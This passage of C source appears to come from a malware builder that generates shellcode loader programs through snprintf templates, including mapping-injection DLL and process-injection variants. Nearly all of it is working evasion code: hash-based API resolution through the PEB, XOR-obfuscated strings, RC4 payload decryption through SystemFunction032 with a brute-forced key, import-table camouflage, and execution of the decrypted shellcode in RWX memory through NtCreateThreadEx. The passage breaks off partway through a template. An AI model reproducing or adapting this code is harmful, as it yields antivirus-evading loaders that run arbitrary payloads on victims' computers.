        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)_toUpper(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "BOOL RC4_Guard(IN BYTE HintByte, IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
        "    BYTE            b = 0;\n"
        "    INT             i = 0;\n"
        "    PBYTE pRealKey = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwRc4KeySize);\n"
        "    HMODULE kernel = GetModuleHandleH(KERNEL32_djb2);\n"
        "    funLoadLibraryA pLoadLibraryA = (funLoadLibraryA)GetProcAddressH(kernel, LoadLibraryA_djb2);\n"
        "    funGetProcAddress pGetProcAddress = (funGetProcAddress)GetProcAddressH(kernel, GetProcAddress_djb2);\n"
        "    if (!pRealKey)\n"
        "        return 0;\n"
        "    while (1) {\n"
        "        if (((pRc4Key[0] ^ b)) == HintByte)\n"
        "            break;\n"
        "        else\n"
        "            b++;\n"
        "    }\n"
        "    for (int i = 0; i < dwRc4KeySize; i++) {\n"
        "        pRealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
        "    }\n"
        "    USTRING Key = { .Buffer = pRealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },\n"
        "        Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };\n"

        "    char pAdvapi32[] = { 'A','d','v','a','p','i','3','2','\\0' };\n"
        "    obf((char*)pFunction032, sizeof(pFunction032), xkey, sizeof(xkey));\n"
        "    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)pGetProcAddress( pLoadLibraryA(pAdvapi32) , pFunction032);\n"
        "    SystemFunction032(&Img, &Key);\n"
        "    return TRUE;\n"
        "}\n"
        "BOOL mapping_injection() {\n"
        "    HANDLE shandle = NULL;\n"
        "    HANDLE thandle = NULL;\n"
        "    PVOID address = NULL;\n"
        "    SIZE_T sViewSize = 0;\n"
        "    LARGE_INTEGER MaximumSize = { .QuadPart = sizeof(EncryptedPayload) };\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    HMODULE ntdll = GetModuleHandleH(NTDLL_djb2);\n"
        "    fnNtCreateSection pNtCreateSection = (fnNtCreateSection)GetProcAddressH(ntdll, NtCreateSection_djb2);\n"
        "    fnNtMapViewOfSection pNtMapViewOfSection = (fnNtMapViewOfSection)GetProcAddressH(ntdll, NtMapViewOfSection_djb2);\n"
        "    fnUnmapViewOfSection pUnmapViewOfSection = (fnUnmapViewOfSection)GetProcAddressH(ntdll, NtUnmapViewOfSection_djb2);\n"
        "    fnNtCreateThreadEx pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddressH(ntdll, NtCreateThreadEx_djb2);\n"
        "    funNtWaitForSingleObject pNtWaitForSingleObject = (funNtWaitForSingleObject)GetProcAddressH(ntdll, NtWaitForSingleObject_djb2);\n"
        "    fnNtClose pNtClose = (fnNtClose)GetProcAddressH(ntdll, NtClose_djb2);\n"
        "    pNtCreateSection(&shandle, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);\n"
        "    pNtMapViewOfSection(shandle, (HANDLE)-1, &address, 0, 0, NULL, &sViewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);\n"
        "    memcpy(address, EncryptedPayload, sizeof(EncryptedPayload));\n"
        "    RC4_Guard(HINT_BYTE, ProtectedKey, address, sizeof(ProtectedKey), sizeof(EncryptedPayload));\n"
        "    pNtCreateThreadEx(&thandle, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, address, NULL, 0, 0, 0, 0, NULL);\n"
        "    pNtWaitForSingleObject(thandle, FALSE, &timeout);\n"
        "    pNtClose(thandle);\n"
        "    pUnmapViewOfSection((HANDLE)-1, address);\n"
        "    pNtClose(shandle);\n"
        "}\n"
        "int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n"
        "    mapping_injection();\n"
        "    return 0;\n"
        "}\n",
        xkey, obfuscated_fun, shellcodeArray, keyArray, hint
    );
}
VOID _source_4_mapping_injection_dll(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint) {
    // Convert shellcode and key to hex string representation
    unsigned char shellcodeArray[8096] = { 0 };
    unsigned char keyArray[5012] = { 0 };
    creatHexArray(shellcodeArray, shellcode, shellcodeSize, sizeof(shellcodeArray));
    creatHexArray(keyArray, key, keySize, sizeof(keyArray));


    char* xkey = generate_random_string_key();
    char* obfuscated_fun = obf("SystemFunction032", xkey);


    snprintf(payload, size,
        "#include <Windows.h>\n"
        "#include <winternl.h>\n\n"
        "typedef struct {\n"
        "    DWORD Length;\n"
        "    DWORD MaximumLength;\n"
        "    PVOID Buffer;\n"
        "} USTRING;\n"
        "typedef NTSTATUS(NTAPI* fnSystemFunction032)(USTRING* Img, USTRING* Key);\n"
        "typedef HMODULE(NTAPI* funLoadLibraryA)(LPCSTR);\n"
        "typedef enum _SECTION_INHERIT {\n"
        "    ViewShare = 1,\n"
        "    ViewUnmap = 2\n"
        "} SECTION_INHERIT, * PSECTION_INHERIT;\n"
        "typedef struct _PS_ATTRIBUTE {\n"
        "    ULONG Attribute;\n"
        "    SIZE_T Size;\n"
        "    union {\n"
        "        ULONG Value;\n"
        "        PVOID ValuePtr;\n"
        "    } ul;\n"
        "    PSIZE_T ReturnLength;\n"
        "} PS_ATTRIBUTE, * PPS_ATTRIBUTE;\n"
        "typedef struct _PS_ATTRIBUTE_LIST {\n"
        "    SIZE_T  TotalLength;\n"
        "    PS_ATTRIBUTE Attributes[1];\n"
        "} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;\n"
        "typedef NTSTATUS(NTAPI* fnNtCreateSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);\n"
        "typedef NTSTATUS(NTAPI* fnNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);\n"
        "typedef NTSTATUS(NTAPI* fnUnmapViewOfSection)(HANDLE, PVOID);\n"
        "typedef NTSTATUS(NTAPI* fnNtCreateThreadEx) (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);\n"
        "typedef NTSTATUS(NTAPI* funNtWaitForSingleObject) (HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* fnNtClose)(HANDLE);\n"
        "typedef FARPROC(NTAPI* funGetProcAddress)(HMODULE, LPCSTR);\n"
        "CHAR _toUpper(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "char memory_pool[1024];\n"
        "unsigned int pool_index = 0;\n"
        "void* my_malloc(unsigned int size) {\n"
        "    if (pool_index + size > sizeof(memory_pool)) {\n"
        "        return 0; \n"
        "    }\n"
        "    void* ptr = &memory_pool[pool_index];\n"
        "    pool_index += size;\n"
        "    return ptr;\n"
        "}\n\n"
        "#define NTDLL_djb2                  0x5251037A\n"
        "#define KERNEL32_djb2               0xA5E086A2\n"
        "#define NtCreateSection_djb2        0x468A2FDD\n"
        "#define NtMapViewOfSection_djb2     0xC0261277\n"
        "#define NtUnmapViewOfSection_djb2   0x129AF9DA\n"
        "#define NtWaitForSingleObject_djb2  0xCB42C5A9\n"
        "#define NtCreateThreadEx_djb2       0x61D8C71D\n"
        "#define NtDelayExecution_djb2       0x1236E2D7\n"
        "#define NtClose_djb2                0xF20D7F2A\n"
        "#define LoadLibraryA_djb2           0xA4E3F108\n"
        "#define GetProcAddress_djb2         0xB9D893EC\n"
        "\nvoid obf(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char pFunction032[] = {%s};\n"

        "unsigned char EncryptedPayload[] = { %s };\n"
        "unsigned char ProtectedKey[] = { %s };\n"
        "#define HINT_BYTE 0x%02X\n\n"
        "#define INITIAL_HASH 4338         \n"
        "#define INITIAL_SEED 7 \n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)_toUpper(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "BOOL RC4_Guard(IN BYTE HintByte, IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
        "    BYTE            b = 0;\n"
        "    INT             i = 0;\n"
        "    PBYTE           pRealKey = (PBYTE)my_malloc(dwRc4KeySize);\n"
        "    HMODULE kernel = GetModuleHandleH(KERNEL32_djb2);\n"
        "    funLoadLibraryA pLoadLibraryA = (funLoadLibraryA)GetProcAddressH(kernel, LoadLibraryA_djb2);\n"
        "    funGetProcAddress pGetProcAddress = (funGetProcAddress)GetProcAddressH(kernel, GetProcAddress_djb2);\n"
        "    if (!pRealKey)\n"
        "        return 0;\n"
        "    while (1) {\n"
        "        if (((pRc4Key[0] ^ b)) == HintByte)\n"
        "            break;\n"
        "        else\n"
        "            b++;\n"
        "    }\n"
        "    for (int i = 0; i < dwRc4KeySize; i++) {\n"
        "        pRealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);\n"
        "    }\n"
        "    USTRING Key = { .Buffer = pRealKey, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize },\n"
        "        Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };\n"
        "    char pAdvapi32[] = { 'A','d','v','a','p','i','3','2','\\0' };\n"
        "    obf((char*)pFunction032, sizeof(pFunction032), xkey, sizeof(xkey));\n"
        "    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)pGetProcAddress(pLoadLibraryA(pAdvapi32),pFunction032 );\n"
        "    SystemFunction032(&Img, &Key);\n"
        "    return TRUE;\n"
        "}\n"
        "BOOL mapping_injection() {\n"
        "    HANDLE shandle = NULL;\n"
        "    HANDLE thandle = NULL;\n"
        "    PVOID address = NULL;\n"
        "    SIZE_T sViewSize = 0;\n"
        "    LARGE_INTEGER MaximumSize = { .QuadPart = sizeof(EncryptedPayload) };\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    HMODULE ntdll = GetModuleHandleH(NTDLL_djb2);\n"
        "    fnNtCreateSection pNtCreateSection = (fnNtCreateSection)GetProcAddressH(ntdll, NtCreateSection_djb2);\n"
        "    fnNtMapViewOfSection pNtMapViewOfSection = (fnNtMapViewOfSection)GetProcAddressH(ntdll, NtMapViewOfSection_djb2);\n"
        "    fnUnmapViewOfSection pUnmapViewOfSection = (fnUnmapViewOfSection)GetProcAddressH(ntdll, NtUnmapViewOfSection_djb2);\n"
        "    fnNtCreateThreadEx pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddressH(ntdll, NtCreateThreadEx_djb2);\n"
        "    funNtWaitForSingleObject pNtWaitForSingleObject = (funNtWaitForSingleObject)GetProcAddressH(ntdll, NtWaitForSingleObject_djb2);\n"
        "    fnNtClose pNtClose = (fnNtClose)GetProcAddressH(ntdll, NtClose_djb2);\n"
        "    pNtCreateSection(&shandle, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);\n"
        "    pNtMapViewOfSection(shandle, (HANDLE)-1, &address, 0, 0, NULL, &sViewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);\n"
        "    memcpy(address, EncryptedPayload, sizeof(EncryptedPayload));\n"
        "    RC4_Guard(HINT_BYTE, ProtectedKey, address, sizeof(ProtectedKey), sizeof(EncryptedPayload));\n"
        "    pNtCreateThreadEx(&thandle, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, address, NULL, 0, 0, 0, 0, NULL);\n"
        "    pNtWaitForSingleObject(thandle, FALSE, &timeout);\n"
        "    pNtClose(thandle);\n"
        "    pUnmapViewOfSection((HANDLE)-1, address);\n"
        "    pNtClose(shandle);\n"
        "}\n"
        "VOID run() {\n"
        "    mapping_injection();\n"
        "}\n"
        "extern __declspec(dllexport) int hacked() {\n"
        "    run();\n"
        "}\n"
        "BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {\n"
        "    switch (ul_reason_for_call)  {\n"
        "    case DLL_PROCESS_ATTACH:\n"
        "    case DLL_PROCESS_DETACH:\n"
        "    case DLL_THREAD_ATTACH:\n"
        "    case DLL_THREAD_DETACH:\n"
        "        break;\n"
        "    }\n"
        "    return TRUE;\n"
        "}\n",
        xkey, obfuscated_fun, shellcodeArray, keyArray, hint
    );
}
VOID _source_5_process_injection(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint) {
    // Convert shellcode and key to hex string representation
    unsigned char shellcodeArray[8096] = { 0 };
    unsigned char keyArray[5012] = { 0 };
    creatHexArray(shellcodeArray, shellcode, shellcodeSize, sizeof(shellcodeArray));
    creatHexArray(keyArray, key, keySize, sizeof(keyArray));



    char* xkey = generate_random_string_key();
    char* obfuscated_fun = obf("SystemFunction032", xkey);

    snprintf(payload, size,
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "typedef struct {\n"
        "    DWORD Length;\n"
        "    DWORD MaximumLength;\n"
        "    PVOID Buffer;\n"
        "} USTRING;\n"
        "typedef NTSTATUS(NTAPI* fnSystemFunction032)(USTRING* Img, USTRING* Key);\n"
        "typedef HMODULE(NTAPI* funLoadLibraryA)(LPCSTR);\n"
        "typedef enum _SECTION_INHERIT {\n"
        "    ViewShare = 1,\n"
        "    ViewUnmap = 2\n"
        "} SECTION_INHERIT, * PSECTION_INHERIT;\n"
        "typedef struct _PS_ATTRIBUTE {\n"
        "    ULONG Attribute;\n"
        "    SIZE_T Size;\n"
        "    union {\n"
        "        ULONG Value;\n"
        "        PVOID ValuePtr;\n"
        "    } ul;\n"
        "    PSIZE_T ReturnLength;\n"
        "} PS_ATTRIBUTE, * PPS_ATTRIBUTE;\n"
        "typedef struct _PS_ATTRIBUTE_LIST {\n"
        "    SIZE_T  TotalLength;\n"
        "    PS_ATTRIBUTE Attributes[1];\n"
        "} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;\n"
        "typedef NTSTATUS(NTAPI* funNtAllocateVirtualMemory)(HANDLE ,PVOID* ,ULONG_PTR ,PSIZE_T ,ULONG ,ULONG );\n"
        "typedef NTSTATUS(NTAPI* funNtProtectVirtualMemory)(HANDLE ,PVOID* ,PSIZE_T ,ULONG ,PULONG );\n"
        "typedef NTSTATUS(NTAPI* fnNtCreateThreadEx) (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);\n"
        "typedef NTSTATUS(NTAPI* funNtWaitForSingleObject) (HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* fnNtClose)(HANDLE);\n"
        "typedef FARPROC(NTAPI* funGetProcAddress)(HMODULE, LPCSTR);\n"
        "CHAR _toUpper(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "int RandomCompileTimeSeed(void)\n"
        "{\n"
        "    return '0' * -40271 +\n"
        "        __TIME__[7] * 1 +\n"
        "        __TIME__[6] * 10 +\n"
        "        __TIME__[4] * 60 +\n"
        "        __TIME__[3] * 600 +\n"
        "        __TIME__[1] * 3600 +\n"
        "        __TIME__[0] * 36000;\n"
        "} \n"
        "PVOID Helper(PVOID* ppAddress) {\n"
        "    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);\n"
        "    if (!pAddress)\n"
        "        return NULL;\n"
        "    *(int*)pAddress = RandomCompileTimeSeed() %% 0xFF;\n"
        "    *ppAddress = pAddress;\n"
        "    return pAddress;\n"
        "}\n"
        "VOID IatCamouflage() {\n"
        "    PVOID       pAddress = NULL;\n"
        "    int* A = (int*)Helper(&pAddress);\n"
        "    if (*A > 350) {\n"
        "        unsigned __int64 i = MessageBoxA(0, 0, 0, 0);\n"
        "        i = GetLastError();\n"
        "        i = SetCriticalSectionSpinCount(0, 0);\n"
        "        i = GetWindowContextHelpId(0);\n"
        "        i = GetWindowLongPtrW(0, 0);\n"
        "        i = RegisterClassW(0);\n"
        "        i = IsWindowVisible(0);\n"
        "        i = ConvertDefaultLocale(0);\n"
        "        i = MultiByteToWideChar(0, 0, 0, 0, 0, 0);\n"
        "        i = IsDialogMessageW(0, 0);\n"
        "    }\n"
        "    HeapFree(GetProcessHeap(), 0, pAddress);\n"
        "}\n\n"
        "#define NTDLL_djb2                      0x5251037A\n"
        "#define KERNEL32_djb2                   0xA5E086A2\n"
        "#define NtAllocateVirtualMemory_djb2    0x0B37D3B9\n"
        "#define NtProtectVirtualMemory_djb2     0x504D6BF5\n"
        "#define NtWaitForSingleObject_djb2      0xCB42C5A9\n"
        "#define NtCreateThreadEx_djb2           0x61D8C71D\n"
        "#define NtClose_djb2                    0xF20D7F2A\n"
        "#define LoadLibraryA_djb2               0xA4E3F108\n"
        "#define GetProcAddress_djb2             0xB9D893EC\n\n"

        "\nvoid obf(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xkey[] = \"%s\";\n"
        "char pFunction032[] = {%s};\n"

        "unsigned char EncryptedPayload[] = { %s };\n"
        "unsigned char ProtectedKey[] = { %s };\n"
        "#define HINT_BYTE 0x%02X\n\n"
        "#define INITIAL_HASH 4338         \n"
        "#define INITIAL_SEED 7 \n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER           pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS           pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER       ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY     pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD                      FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD                      FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD                       FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID   pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB                    pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB                    pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)_toUpper(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "BOOL RC4_Guard(IN BYTE HintByte, IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {\n"
        "    BYTE            b = 0;\n"
        "    INT             i = 0;\n"
        "    PBYTE pRealKey = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwRc4KeySize);\n"
        "    HMODULE kernel = GetModuleHandleH(KERNEL32_djb2);\n"
        "    funLoadLibraryA pLoadLibraryA = (funLoadLibraryA)GetProcAddressH(kernel, LoadLibraryA_djb2);\n"
        "    funGetProcAddress pGetProcAddress = (funGetProcAddress)GetProcAddressH(kernel, GetProcAddress_djb2);\n"

        "    if (!pRealKey)\n"
        "        return 0;\n"
        "    while (1) {\n"
        "        if (((pRc4Key[0] ^ b)) == HintByte)\n"
        "            break;\n"
        "        else\n"
        "            b++;\n"
        "    }\n"
        "    for (int i = 0; i < dwRc4KeySize; i++) {\n"
